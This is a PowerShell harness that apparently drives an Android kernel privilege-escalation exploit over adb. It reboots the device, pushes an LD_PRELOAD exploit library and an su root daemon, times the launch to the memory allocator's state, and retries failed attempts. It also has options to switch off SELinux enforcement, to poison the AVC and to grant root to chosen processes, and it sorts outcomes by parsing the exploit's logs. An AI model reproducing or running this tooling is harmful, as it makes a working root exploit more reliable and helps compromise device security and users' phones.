# A/B probe: adaptive settle (B') + one in-boot retry after a benign miss (A).
#
# Why a separate script: probe_boot.ps1 is the frozen control arm (fixed 320 s,
# one attempt per boot).  Keeping it untouched is what makes an A/B meaningful.
#
# B' settle: /proc/buddyinfo is NOT readable by shell on this device (the exploit
# logs "buddyinfo unreadable" too), so the stability signal is MemFree from
# /proc/meminfo: sample every 10 s and launch once meminfo has been quiet
# (|delta MemFree| <= 4 MB) for three consecutive samples, with uptime >= 60 s and
# a hard cap of 320 s.  Every sample goes into the log, so one batch also answers
# "how long does this device actually take to go quiet".
#
# A retry: after a NON-panicking failed attempt (the exploit returned normally but
# did not reach the judge), kill same-uid leftovers, wait 5 s, and run once more in
# the SAME boot without a settle.  STATE 2026-11-11 (b1 3/6 vs 0/8, 0/10) predicts
# this fails because the allocator is already polluted; we measure it rather than
# assume, counting landings per wall-clock hour and not per boot.
#
# Log safety (this is the part that has burned whole nights):
#   * every attempt -> probe/<tag><n>.log  (host, from Start-Process redirect)
#   * device-side /data/local/tmp/l5r.log pulled to probe/<tag><n>.dev.log,
#     retried 5x because a crashing boot makes the first pull fail
#   * one CSV row per attempt -> probe/ab_summary.csv, so the numbers survive even
#     if the console stream is lost
param(
  [string]$settle = 'adaptive',   # adaptive | fixed
  [int]$fixedSeconds = 320,
  [int]$max = 10,
  [string]$tag = 'v',
  [switch]$noRetry,
  [switch]$grant,         # grant test: spawn a target, ask the gate to patch it
  [string]$reqPrefix = 'grant',   # request verb written BEFORE landing (grant | grants)
  [string]$launchPkg = '',        # launch this package after reboot, use its pid as the target
  [switch]$lean,          # survival probe: gate restores the pinned pid and idles
  [switch]$serve,         # keep the gate resident and serving req.txt requests
  [switch]$selinuxoff,    # write selinux_state.enforcing = 0 before the child runs
  [switch]$avc,           # child: deny touch -> avc_poison -> retry, before starting su
  [switch]$console,       # also stream the exploit's [*] lines to this window

  # ---- 路径与设备：默认从仓库自身推算，可用参数或环境变量覆盖 ----
  [string]$Adb    = $(if ($env:ADB)    { $env:ADB }    else { 'C:\Android\android-sdk\platform-tools\adb.exe' }),
  [string]$Serial = $(if ($env:ANDROID_SERIAL) { $env:ANDROID_SERIAL } else { '4EU0222111007420' }),
  [string]$So     = '',   # 默认 <repo>\payload\build\nop_nop_an01p\bin\preload.so
  [string]$Su     = '',   # 默认 <repo>\payload\build\embed\su_daemon_aarch64_pie
  [string]$OutDir = ''    # 默认 <repo>\probe
)
$ErrorActionPreference = 'Continue'
$repo = Split-Path -Parent $PSScriptRoot
$adb = $Adb
$S   = $Serial
# Some adb servers keep a ghost entry for the serial after a device reboot:
# `adb devices` lists it but every -s command answers "device not found", while a
# serial-less command still works because only one device is attached.
$sa = @('-s', $S)
$st = (& $adb -s $S get-state 2>&1 | Out-String).Trim()
if ($st -ne 'device') {
  $n = @(& $adb devices | Select-String '\sdevice$').Count
  if ($n -eq 1) { $sa = @(); Write-Host 'adb: serial unusable, using the single attached device' }
  else { Write-Host "adb: serial unusable, $n devices attached" }
}
if (-not $So)  { $So  = Join-Path $repo 'payload\build\nop_nop_an01p\bin\preload.so' }
if (-not $Su)  { $Su  = Join-Path $repo 'payload\build\embed\su_daemon_aarch64_pie' }
if (-not $OutDir) { $OutDir = Join-Path $repo 'probe' }
$so  = $So
$sud = $Su
$dir = $OutDir
New-Item -ItemType Directory -Force -Path $dir | Out-Null
$csv = Join-Path $dir 'ab_summary.csv'
if (-not (Test-Path $csv)) {
  'tag,attempt,arm,settle_s,kind,judged,retried,started' | Set-Content -Path $csv
}
$gcsv = Join-Path $dir 'grant_summary.csv'
if (-not (Test-Path $gcsv)) {
  'tag,attempt,kind,judged,tpid,alive,uid_line,started' | Set-Content -Path $gcsv
}
$REQ = '/sdcard/Android/data/com.l5.root/files/l5/req.txt'

function Get-MemFreeKb {
  $r = (& $adb @sa shell 'grep MemFree /proc/meminfo' 2>&1 | Out-String)
  if ($r -match '(\d+)') { return [int]$Matches[1] }
  return -1
}

function Wait-Settle {
  if ($settle -eq 'fixed') {
    Start-Sleep -Seconds $fixedSeconds
    return $fixedSeconds
  }
  $quiet = 0
  $prev = -1
  $elapsed = 0
  for ($i = 0; $i -lt 33; $i++) {
    $up = (& $adb @sa shell 'cut -d" " -f1 /proc/uptime' 2>&1 | Out-String)
    $upt = 0.0
    if ($up -match '(\d+\.?\d*)') { $upt = [double]$Matches[1] }
    $mf = Get-MemFreeKb
    $d = 0
    if ($prev -gt 0 -and $mf -gt 0) { $d = [Math]::Abs($mf - $prev) }
    Write-Host ("   settle t={0,3}s uptime={1,5:N0}s memfree={2,7}kB d={3,6}kB" -f $elapsed, $upt, $mf, $d)
    if ($prev -gt 0 -and $mf -gt 0 -and $d -le 4096) { $quiet++ } else { $quiet = 0 }
    $prev = $mf
    if ($upt -ge 60 -and $quiet -ge 3) {
      Write-Host ("   settle decided at {0}s (meminfo quiet)" -f $elapsed)
      return $elapsed
    }
    Start-Sleep -Seconds 10
    $elapsed += 10
  }
  Write-Host '   settle hit the 320 s cap'
  return 320
}

function Run-OneAttempt {
  param([string]$logSuffix)
  $envpart = "CVE43499_GATE=/data/local/tmp/.hkg_${tag}_x "
  if ($lean) { $envpart += "CVE43499_LEAN=1 " }
  if ($serve) { $envpart += "CVE43499_SERVE=1 " }
  if ($selinuxoff) { $envpart += "CVE43499_SELINUX_OFF=1 " }
  if ($avc) { $envpart += "CVE43499_AVC=1 " }
  $shellcmd = "cd /data/local/tmp && exec env $envpart LD_PRELOAD=/data/local/tmp/glp.so /system/bin/sh -c true"
  $of = Join-Path $dir ("{0}{1}.log" -f $tag, $logSuffix)
  $p = Start-Process -FilePath $adb -ArgumentList ($sa + @('shell', $shellcmd)) `
        -RedirectStandardOutput $of -RedirectStandardError ($of + '.err') -PassThru -NoNewWindow
  $hold = $lean -or $serve
  $waitMs = 600000
  if ($hold) { $waitMs = 120000 }
  # Stream the exploit's own [*] lines to this window while it runs.  The file is
  # still the source of truth (and every classifier below reads it), so -console
  # only mirrors what is already being written.
  $seen = 0
  $sw = [System.Diagnostics.Stopwatch]::StartNew()
  $finished = $false
  while (-not $finished) {
    if ($console) {
      $all = @(Get-Content $of -ErrorAction SilentlyContinue)
      if ($all.Count -gt $seen) {
        for ($i = $seen; $i -lt $all.Count; $i++) {
          Write-Host ("   | " + $all[$i])
        }
        $seen = $all.Count
      }
    }
    $finished = $p.WaitForExit(250)
    if (-not $finished -and $sw.ElapsedMilliseconds -gt $waitMs) { break }
  }
  if ($console) {
    $all = @(Get-Content $of -ErrorAction SilentlyContinue)
    if ($all.Count -gt $seen) {
      for ($i = $seen; $i -lt $all.Count; $i++) {
        Write-Host ("   | " + $all[$i])
      }
    }
  }
  if (-not $finished -and -not $hold) { try { $p.Kill() } catch {} }
  Start-Sleep -Seconds 3
  $devlog = Join-Path $dir ("{0}{1}.dev.log" -f $tag, $logSuffix)
  for ($k = 0; $k -lt 5; $k++) {
    & $adb @sa pull /data/local/tmp/l5r.log $devlog 2>&1 | Out-Null
    if (Test-Path $devlog) { break }
    Start-Sleep -Seconds 10
  }
  $log = @(Get-Content $of -ErrorAction SilentlyContinue)
  $txt = ($log -join "`n")
  # A real landing is the parent reaching its E2E block.  "armed pid=" alone is
  # not enough: measured d2,1/d2,2 reached the uidbit stage and then crashed,
  # and counting those as judged burned two 60 s attempts per batch.
  $judged  = ($txt -match 'e2e status written')
  $injector = ($txt -match 'armed pid=')
  $nopair  = ($txt -match 'KernelSnitch sk_buff page leak failed|page child did not report base')
  $cfi     = ($txt -match 'cfi pre-check rb=8')
  $landed  = ($txt -match 'pselect returned .*ret=-1 errno=4')
  $timeout = ($txt -match 'pselect returned .*ret=0 errno=0')
  $kind = if ($injector) { 'injector' }
          elseif ($judged) { 'judge' }
          elseif ($nopair) { 'nopair' }
          elseif ($cfi) { 'cfi' }
          elseif ($landed) { 'landed' }
          elseif ($timeout) { 'cfi-miss' }
          else { 'panic' }
  Write-Host ("   -> {0}  lines={1} finished={2} judged={3}" -f $kind, $log.Count, $finished, $judged)
  return [pscustomobject]@{ Kind = $kind; Judged = $judged; Lines = $log.Count }
}

$t0 = Get-Date
for ($a = 1; $a -le $max; $a++) {
  Write-Host ("[{0}/{1}] reboot for a fresh allocator (arm={2})" -f $a, $max, $settle)
  & $adb @sa reboot 2>&1 | Out-Null
  Start-Sleep -Seconds 20
  $up = $false
  for ($i = 0; $i -lt 60; $i++) {
    $d = (& $adb devices 2>&1 | Select-String $S)
    if ("$d" -match 'device\s*$') { $up = $true; break }
    Start-Sleep -Seconds 5
  }
  if (-not $up) { Write-Host '   device never came back'; continue }
  & $adb @sa push $so /data/local/tmp/glp.so 2>&1 | Out-Null
  & $adb @sa shell 'chmod 755 /data/local/tmp/glp.so' 2>&1 | Out-Null
  # The root daemon is no longer embedded in preload.so (it cost ~18 KB of the
  # punch budget); push it alongside so the .so can stay small and stable.
  & $adb @sa push $sud /data/local/tmp/su 2>&1 | Out-Null
  & $adb @sa shell 'chmod 755 /data/local/tmp/su' 2>&1 | Out-Null

  $settleS = Wait-Settle

  # Grant test target: a live foreign process in the shell domain.  It must be
  # spawned AFTER the reboot and BEFORE the exploit runs, because the gate only
  # reads req.txt once (right after it lands).
  $tpid = 0
  if ($launchPkg -ne '') {
    # Target is the manager app itself: it must be running before the exploit so
    # the pid exists in this boot, and the request has to be on disk BEFORE the
    # gate lands (the gate reads req.txt once, right after landing).
    & $adb @sa shell "am start -n $launchPkg/.MainActivity" 2>&1 | Out-Null
    Start-Sleep -Seconds 4
    $o = (& $adb @sa shell "pidof $launchPkg" 2>&1 | Out-String).Trim()
    if ($o -match '(\d+)') { $tpid = [int]$Matches[1] }
    if ($tpid -gt 0) {
      & $adb @sa shell "echo '$reqPrefix $tpid' > $REQ" 2>&1 | Out-Null
      Write-Host ("   {0} target pkg={1} pid={2} (req.txt written)" -f $reqPrefix, $launchPkg, $tpid)
    } else {
      Write-Host ("   launch target FAILED raw=[{0}]" -f $o)
    }
  } elseif ($grant) {
    $o = (& $adb @sa shell 'nohup sleep 3600 >/dev/null 2>&1 & echo $!' 2>&1 | Out-String).Trim()
    if ($o -match '(\d+)') { $tpid = [int]$Matches[1] }
    if ($tpid -gt 0) {
      & $adb @sa shell "echo '$reqPrefix $tpid' > $REQ" 2>&1 | Out-Null
      Write-Host ("   {0} target pid={1} (req.txt written)" -f $reqPrefix, $tpid)
    } else {
      Write-Host ("   grant target spawn FAILED raw=[{0}]" -f $o)
    }
  }

  $r = Run-OneAttempt -logSuffix $a
  $retried = 0
  $kind = $r.Kind
  $judged = $r.Judged

  # A: benign miss (exploit returned normally, no panic, no judge) -> retry once.
  if (-not $noRetry -and -not $judged -and $kind -ne 'panic') {
    Write-Host '   benign miss -> killing same-uid leftovers and retrying in this boot'
    & $adb @sa shell 'pkill -f glp.so; pkill -f "sh -c true"' 2>&1 | Out-Null
    Start-Sleep -Seconds 5
    $r2 = Run-OneAttempt -logSuffix ("{0}r" -f $a)
    $retried = 1
    $kind = "$kind|$($r2.Kind)"
    $judged = $r2.Judged
    if ($judged) { Write-Host '   *** retry produced the judge ***' }
  }

  $row = '{0},{1},{2},{3},{4},{5},{6},{7}' -f $tag, $a, $settle, $settleS, $kind, $judged, $retried, (Get-Date -Format s)
  Add-Content -Path $csv -Value $row
  Write-Host ("   csv: {0}" -f $row)
  if ($tpid -gt 0) {
    $alive = (& $adb @sa shell "test -d /proc/$tpid && echo yes || echo no" 2>$null | Out-String).Trim()
    $ul = (& $adb @sa shell "grep -E '^(Uid|CapEff):' /proc/$tpid/status" 2>$null | Out-String).Trim() -replace "`r?`n", ';'
    Write-Host ("   target {0} alive={1} {2}" -f $tpid, $alive, $ul)
    '{0},{1},{2},{3},{4},{5},{6},{7}' -f $tag, $a, $kind, $judged, $tpid, $alive, $ul, (Get-Date -Format s) |
      Add-Content -Path $gcsv
  }
  if ($judged) {
    Write-Host '*** JUDGE FOUND - stopping this batch ***'
    break
  }
}
$el = ((Get-Date) - $t0).TotalMinutes
Write-Host ("AB BATCH DONE arm={0} elapsed={1:N1} min" -f $settle, $el)
